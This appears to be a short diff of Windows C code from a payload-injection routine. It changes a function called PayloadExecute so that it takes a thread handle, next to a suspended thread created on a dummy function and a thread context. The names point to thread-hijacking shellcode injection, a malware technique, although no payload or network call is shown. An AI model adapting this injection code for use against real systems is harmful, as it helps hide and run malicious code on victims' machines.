@@ -7,7 +7,7 @@ DWORD WINAPI DummyFunction(LPVOID lpParam) {
     return 0;
 }
 
-BOOL PayloadExecute(IN OPTIONAL HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {
+BOOL PayloadExecute(IN OPTIONAL HANDLE hProcess, IN OPTIONAL HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {
 	
 	PVOID    pAddress         = NULL;
 	DWORD    dwOldProtection  = NULL;
@@ -15,7 +15,7 @@ BOOL PayloadExecute(IN OPTIONAL HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sP
 			.ContextFlags = CONTEXT_CONTROL 
 		};
 
-    HANDLE hThread = pCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &DummyFunction, NULL, CREATE_SUSPENDED, NULL);
+    hThread = pCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &DummyFunction, NULL, CREATE_SUSPENDED, NULL);
 	if (hThread == NULL) {
 		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
 		return FALSE;
